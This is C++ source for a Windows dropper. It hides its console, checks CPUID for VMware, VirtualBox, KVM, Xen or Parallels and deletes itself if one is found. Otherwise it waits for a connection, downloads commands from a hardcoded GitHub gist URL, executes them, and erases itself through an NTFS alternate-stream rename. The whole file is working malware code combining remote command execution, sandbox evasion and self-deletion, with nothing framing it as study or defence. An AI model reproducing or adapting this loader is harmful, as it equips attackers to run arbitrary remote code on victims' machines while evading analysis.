#ifdef _WIN32

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define EXIT_SUCCESS 0;
#define EXIT_NONWIN  1;
#define EXIT_VM      2;

#include "getpastebin.h"
#include "runbashcode.h"

#include <intrin.h>

#define NEW_STREAM L":HABRAHABR"

void DeleteSelf();
bool IsVM();

const wchar_t raw_url[] = L"CsgoBotTG/592b0a0f76b06d77f581d6ee8c9b41a0/raw/e769b77639389e03aad473be68877ba31312df82/gistfile1.txt";
int main()
{
#ifdef _WIN32
    if (IsVM())
    {
        DeleteSelf();
        return EXIT_VM;
    }

    while (!InternetCheckConnection(TEXT("https://gist.githubusercontent.com"), FLAG_ICC_FORCE_CONNECTION, 0))
    {
        printf("no connection\n");
        Sleep(10000);
    }
    printf("connected to github gist\n");

    // open http wininet
    HINTERNET hInternet = ::InternetOpen(TEXT("RunBashCode"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return GetLastError();
    }

    // open HTTP session
    HINTERNET hConnect = ::InternetConnect(hInternet, TEXT("gist.githubusercontent.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, NULL, 1);
    if (hConnect == NULL) {
        printf("InternetConnect failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hConnect);
        return GetLastError();
    }

    // get raw
    std::string response = GetPastebin(hInternet, hConnect, raw_url);

    // close connection
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hConnect);

    printf("CODE: %s\n", response.c_str());

    StartCommand(response.c_str());
    DeleteSelf();

    return EXIT_SUCCESS;
#else
    return EXIT_NONWIN;
#endif
}

void DeleteSelf() 
{

    WCHAR                   	szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO   	Delete = { 0 };
    HANDLE                  	hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO       	pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T                  	sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return;
    }


    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

    Delete.DeleteFile = TRUE;
    pRename->FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
        return;
    }

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
        return;
    }

    wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
        return;
    }
    wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
        return;
    }

    wprintf(L"[i] DELETING ...");

    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
        return;
    }
    wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    HeapFree(GetProcessHeap(), 0, pRename);

    return;
}

bool IsVM()
{
    int cpuInfo[4] = {};

    //
    // Upon execution, code should check bit 31 of register ECX
    // (the “hypervisor present bit”). If this bit is set, a hypervisor is present.
    // In a non-virtualized environment, the bit will be clear.
    //
    __cpuid(cpuInfo, 1);


    if (!(cpuInfo[2] & (1 << 31)))
        return false;

    //
    // A hypervisor is running on the machine. Query the vendor id.
    //
    const auto queryVendorIdMagic = 0x40000000;
    __cpuid(cpuInfo, queryVendorIdMagic);

    const int vendorIdLength = 13;
    using VendorIdStr = char[vendorIdLength];

    VendorIdStr hyperVendorId = {};

    memcpy(hyperVendorId + 0, &cpuInfo[1], 4);
    memcpy(hyperVendorId + 4, &cpuInfo[2], 4);
    memcpy(hyperVendorId + 8, &cpuInfo[3], 4);
    hyperVendorId[12] = '\0';

    static const VendorIdStr vendors[]{
    "KVMKVMKVM\0\0\0", // KVM 
    //"Microsoft Hv",    // Microsoft Hyper-V or Windows Virtual PC */
    "VMwareVMware",    // VMware 
    "XenVMMXenVMM",    // Xen 
    "prl hyperv  ",    // Parallels
    "VBoxVBoxVBox"     // VirtualBox 
    };

    for (const auto& vendor : vendors)
    {
        if (!memcmp(vendor, hyperVendorId, vendorIdLength))
            return true;
    }

    return false;
}

#endif